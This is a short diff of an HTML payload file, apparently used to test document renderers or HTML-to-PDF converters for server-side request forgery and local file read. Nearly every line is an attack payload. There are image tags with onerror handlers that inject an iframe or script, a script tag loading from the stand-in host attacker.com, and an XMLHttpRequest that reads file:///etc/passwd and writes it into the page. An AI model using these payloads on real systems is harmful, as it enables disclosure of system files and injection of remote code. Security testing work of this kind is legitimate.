@@ -93,7 +93,7 @@
             <img src="../../../index.php">
             <img src="../../../../index.php">
             <script src="http://attacker.com/myscripts.js"></script>
-			<img src="xasdasdasd" onerror="document.write('<script src="http://127.0.0.1/index.php"></script>')"/>
+			<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
             <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd"); x.send(); </script>
             
             </div>
